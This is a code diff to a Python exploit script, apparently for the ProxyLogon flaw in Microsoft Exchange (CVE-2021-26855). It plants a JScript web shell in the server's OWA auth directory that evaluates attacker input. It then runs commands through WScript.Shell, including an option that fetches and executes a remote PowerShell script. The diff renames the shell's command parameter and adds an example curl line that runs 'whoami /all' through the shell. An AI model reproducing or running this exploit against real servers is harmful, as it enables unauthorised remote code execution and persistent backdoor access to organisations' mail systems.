@@ -35,7 +35,7 @@ class ProxyLogon:
     def __init__(self, target, user, cmd, revPSScriptUrl):
         self.target = target
         self.user = user
-        self.cmd = cmd
+        self.cmd = "" if cmd == None else cmd
         self.ps_script_url = (
             ""
             if revPSScriptUrl == None
@@ -50,7 +50,7 @@ class ProxyLogon:
             % self.shell_name
         )
         self.shell_url = "https://%s/owa/auth/%s" % (self.target, self.shell_name)
-        self.shell_payload = 'http://ooo/#<script language="JScript" runat="server">function Page_Load(){eval(Request["request"],"unsafe");}</script>'
+        self.shell_payload = 'http://iml/#<script language="JScript" runat="server">function Page_Load(){eval(Request["cmd"],"unsafe");}</script>'
 
     @staticmethod
     def GetRandomString(size=5, chars=string.ascii_lowercase + string.digits) -> str:
@@ -92,7 +92,6 @@ class ProxyLogon:
         if result.status_code != 200:
             print("Autodiscover failure.")
 
-        # TODO: FInd a better way of doing this
         self.legacy_dn = result.text.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
         self.server_id = result.text.split("<Server>")[1].split("</Server>")[0]
         print("LegacyDN: %s" % (self.legacy_dn))
@@ -266,16 +265,17 @@ class ProxyLogon:
             json=OAB_Payload,
             verify=False,
         )
+        print("Shell ready, you can post extra commands to this with 'cmd' parameter:")
         print(
-            "Shell ready, you can post extra commands to this with 'request' parameter:"
+            """e.g. curl -X POST --url %s --header 'Content-Type: application/x-www-form-urlencoded' --data 'cmd=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami /all").stdout.readall())' -ks"""
+            % self.shell_url
         )
-        print(self.shell_url)
 
     def ExecCmd(self, command):
         print("Executing: %s" % command)
         time.sleep(5)
         shell_payload = (
-            """request=Response.Write(new ActiveXObject("WScript.Shell").exec("%s").stdout.readall())"""
+            """cmd=Response.Write(new ActiveXObject("WScript.Shell").exec("%s").stdout.readall())"""
             % command
         )
         result = requests.post(
@@ -289,7 +289,7 @@ class ProxyLogon:
         )
         if result.status_code != 200:
             print("Command failed")
-        print(result.text)
+        print(result.text.split("\r\nName")[0])
 
     def run(self):
         # CVE-2021-26855
@@ -304,7 +304,8 @@ class ProxyLogon:
         self.PushOABShell()
         self.PopOABShell()
         # Pop that powershell
-        self.ExecCmd(self.cmd)
+        if self.cmd != "":
+            self.ExecCmd(self.cmd)
         if self.ps_script_url != "":
             self.ExecCmd(self.ps_script_url)
         return 0
@@ -321,17 +322,17 @@ def GetArgs():
         "-t", "--target", type=str, help="Exchange server to target.", required=True
     )
     parser.add_argument(
-        "-u", "--user", type=str, help="User email address to target.", required=True
+        "-e", "--user", type=str, help="User email address to target.", required=True
     )
-    parser.add_argument(
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument(
         "-r", "--psurl", type=str, help="Url for powershell script to be executed."
     )
-    parser.add_argument(
+    group.add_argument(
         "-c",
         "--cmd",
         type=str,
-        help="Command to run against server default = whoami /all",
-        default="whoami /all",
+        help="Command to run against server",
     )
     args = parser.parse_args()
     return args
